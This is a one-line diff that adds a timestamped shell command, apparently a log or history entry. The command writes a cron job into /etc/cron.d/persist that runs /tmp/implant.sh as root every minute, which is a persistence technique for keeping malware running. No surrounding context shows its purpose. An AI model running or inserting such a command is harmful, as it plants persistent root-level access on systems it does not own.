@@ -1,0 +1,1 @@
+1757000004.2 echo '* * * * * root /tmp/implant.sh' > /etc/cron.d/persist
